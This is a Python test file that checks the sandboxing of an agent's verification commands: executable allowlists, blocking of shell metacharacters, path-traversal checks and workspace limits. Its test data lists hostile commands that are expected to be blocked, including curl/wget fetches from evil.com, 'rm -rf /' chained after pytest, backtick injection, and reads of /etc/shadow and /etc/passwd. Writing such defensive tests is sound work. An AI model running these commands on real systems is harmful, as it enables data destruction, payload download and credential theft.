"""Regression tests for FORGE command execution security and containment.

Verifies:
- Verification commands execute correctly on both Windows and Linux without shell=True.
- Parse commands into executable and argument lists.
- Explicit executable allowlist enforcement.
- Validate arguments and reject dangerous operations (; & | > < $ `).
- Enforce configured workspace root for all coding operations.
- Reject directory traversal, symlink escapes, and unauthorized work directories.
"""

from __future__ import annotations

import os
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

from openjarvis.workforce.forge_coding import (
    ALLOWED_VERIFICATION_EXECUTABLES,
    ForgeCodingEngine,
    VerificationStatus,
)


def test_executable_allowlist_enforcement(tmp_path):
    """Executables outside ALLOWED_VERIFICATION_EXECUTABLES must be blocked."""
    engine = ForgeCodingEngine()
    disallowed_cmds = [
        "bash -c 'echo pwned'",
        "powershell.exe -Command Get-Process",
        "cmd.exe /c dir",
        "curl http://evil.com/payload",
        "wget https://evil.com/script.sh",
        "whoami",
        "chmod +x script.sh",
    ]

    for cmd in disallowed_cmds:
        res = engine._run_command(cmd, cwd=str(tmp_path))
        assert not res["passed"]
        assert res["status"] == "blocked"
        assert "not in allowed verification executables" in res["output"]


def test_dangerous_shell_characters_blocked(tmp_path):
    """Commands containing shell chaining/redirection operators must be blocked."""
    engine = ForgeCodingEngine()
    dangerous_injections = [
        "pytest tests/ ; rm -rf /",
        "pytest tests/ && evil_command",
        "pytest tests/ || echo bypass",
        "pytest tests/ | cat",
        "pytest tests/ > output.txt",
        "pytest tests/ < input.txt",
        "python -c 'print($HOME)'",
        "python -c 'echo `whoami`'",
    ]

    for cmd in dangerous_injections:
        res = engine._run_command(cmd, cwd=str(tmp_path))
        assert not res["passed"]
        assert res["status"] == "blocked"
        assert (
            "dangerous shell character" in res["output"]
            or "destructive shell command" in res["output"]
            or "Security policy violation" in res["output"]
            or "Security boundary violation" in res["output"]
        )


def test_directory_traversal_in_command_blocked(tmp_path):
    """Commands attempting directory traversal in arguments must be blocked."""
    engine = ForgeCodingEngine()
    traversal_cmds = [
        "pytest ../../../etc/shadow",
        "pytest tests/..\\..\\secret",
        "python /etc/passwd",
        "pytest C:\\Windows\\System32",
    ]

    for cmd in traversal_cmds:
        res = engine._run_command(cmd, cwd=str(tmp_path))
        assert not res["passed"]
        assert res["status"] == "blocked"
        assert "path traversal" in res["output"] or "resolves outside authorized workspace" in res["output"]


def test_real_subprocess_execution_without_shell(tmp_path):
    """Allowed executables must execute real processes with shell=False on both platforms."""
    engine = ForgeCodingEngine()

    # Successful command
    res_ok = engine._run_command("python --version", cwd=str(tmp_path))
    assert res_ok["passed"] is True
    assert res_ok["status"] == "passed"
    assert res_ok["exit_code"] == 0

    # Failing command (non-zero exit code in trusted environment)
    res_fail = engine._run_command("pytest non_existent_file_xyz_12345.py", cwd=str(tmp_path), trusted_environment=True)
    assert res_fail["passed"] is False
    assert res_fail["status"] == "failed"
    assert res_fail["exit_code"] != 0


def test_unauthorized_workdir_blocked(tmp_path):
    """FORGE execute_coding_task must reject workdirs outside configured allowed_dirs."""
    engine = ForgeCodingEngine()
    # Mock allowed_dirs to be strictly tmp_path / "allowed_zone"
    allowed_zone = tmp_path / "allowed_zone"
    allowed_zone.mkdir()

    unauthorized_zone = tmp_path / "forbidden_zone"
    unauthorized_zone.mkdir()

    with patch("openjarvis.workforce.forge_coding.load_config") as mock_cfg:
        mock_cfg.return_value.security.allowed_dirs = [str(allowed_zone)]
        report = engine.execute_coding_task(
            task_id="task-unauth-test",
            objective="Inspect unauthorized directory",
            workdir=str(unauthorized_zone),
            use_opencode=False,
        )

        assert report.results["verification_status"] == VerificationStatus.BLOCKED.value
        assert report.results["verified"] is False
        assert any("outside authorized workspace" in err for err in report.errors)
